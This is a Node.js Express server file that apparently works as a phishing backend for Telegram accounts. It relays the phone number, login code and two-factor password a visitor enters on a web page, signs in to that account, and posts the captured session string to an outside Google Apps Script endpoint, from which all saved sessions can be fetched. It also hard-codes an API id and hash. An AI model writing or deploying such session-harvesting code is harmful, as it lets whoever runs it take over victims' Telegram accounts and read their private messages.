import express from "express";
import { TelegramClient,password } from "telegram";
import { StringSession } from "telegram/sessions/index.js";
import { Api } from "telegram/tl/index.js";
import fetch from "node-fetch";

const SESSION_FILE = "session.txt";

const app = express();
app.use(express.json());

app.use(express.static("public"));

const apiId = 28293438; // ← заміни
const apiHash = "ff60c6e27b7828b5fdc9795bdd2230d8"; // ← заміни

const userStates = {}; 

console.log("Telegram client started.");


app.post("/sendCode", async (req, res) => {
  try {
   const phoneNumber = req.body.phone;
   const client = new TelegramClient(new StringSession(""), apiId, apiHash, {
   connectionRetries: 5,});

   await client.connect();

    const result = await client.invoke(
      new Api.auth.SendCode({
        phoneNumber,
        apiId,
        apiHash,
        settings: new Api.CodeSettings({
          allow_flashcall: false,
          current_number: false,
          allow_app_hash: true,
        }),
      })
    );

    userStates[phoneNumber] = {
      phoneCodeHash: result.phoneCodeHash,
      client
    };

    res.json({ ok: true, phoneCodeHash: result.phoneCodeHash });
  } catch (err) {
    res.json({ ok: false, error: err.message });
  }
});

app.post("/checkCode", async (req, res) => {
  try {
    const code = req.body.code;
    const phoneNumber = req.body.phone;
    
    const state = userStates[phoneNumber];
    
    if (!state) return res.status(400).json({ ok: false, error: "Send code first" });
   
    const { client, phoneCodeHash} = state;

    const result = await client.invoke(
      new Api.auth.SignIn({
        phoneNumber,
        phoneCodeHash,
        phoneCode: code,
      })
    );


    if (result.className === "auth.AuthorizationSignUpRequired") {
      return res.json({ ok: false, error: "Требуется регистрация" });
    }
    
    const sessionString = client.session.save();
    await saveSessionToSheet(phoneNumber, sessionString);

    res.json({ ok: true, msg: "Signed in", user: result });
  } catch (err) {
        if (err.errorMessage === "SESSION_PASSWORD_NEEDED") {
      return res.json({ ok: false, needPassword: true });
    }

    res.json({ ok: false, error: err.message });
  }
});



app.post("/checkPassword", async (req, res) => {
  try {

    const pwd = req.body.password;
    const phone = req.body.phone;

    const state = userStates[phone];
    const { client } = state;

    const pwdInfo  = await client.invoke(new Api.account.GetPassword());
    const srp = await password.computeCheck(pwdInfo, pwd);

    if (!pwd) return res.status(400).json({ ok: false, error: "Phone and password required" });


    if (!srp) {
      throw new Error("SRP generation failed");
    }

    const result = await client.invoke(
      new Api.auth.CheckPassword({
        password: new Api.InputCheckPasswordSRP({
          srpId: srp.srpId,
          A: srp.A,
          M1: srp.M1,
        }),
      })
    );

    const sessionString = client.session.save();
    await saveSessionToSheet(phone, sessionString);

    res.json({ ok: true, result });

  } catch (err) {
    res.json({ ok: false, error: err.message });
  }
});


app.post("/checkSession", async (req, res) => {
  try {
    const phone = req.body.phone;
    const sessionString = await loadSessionFromSheet(phone);

    if (!sessionString) {
      return res.json({ ok: true, active: false, message: "Session not found" });
    }

    const client = new TelegramClient(new StringSession(sessionString), apiId, apiHash, {
      connectionRetries: 5,
    });
    await client.connect();

    try {
      const me = await client.getMe();

      userStates[phone] = {
      client
    };

      res.json({ ok: true, active: true, message: "Session is active" });
    } catch (err) {
       if (userStates[phone]) {
          delete userStates[phone];
        }     
      res.json({ ok: true, active: false, message: "Session is outdated" });
    }

  } catch (err) {
    res.json({ ok: false, active: false, error: err.message });
  }
});



async function saveSessionToSheet(phone, session) {
  const response = await fetch("https://script.google.com/macros/s/AKfycbxH39mwEeJtrKEZCrbr8rPpUP1CrPu_oZ9LwKo3P_wwOvGcGF4xf2eOn6tJAsh0pnvJJg/exec", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ phone, session })
  });
  const data = await response.json();
  console.log("Session saved:", data);
}

async function loadSessionFromSheet(phone) {
  const response = await fetch("https://script.google.com/macros/s/AKfycbxH39mwEeJtrKEZCrbr8rPpUP1CrPu_oZ9LwKo3P_wwOvGcGF4xf2eOn6tJAsh0pnvJJg/exec");
  const data = await response.json();

  const record = data.find(r => r.phone === phone);
  if (!record) return "";

  return record.session;
}



app.listen(3000, () => console.log("Server running on 3000"));
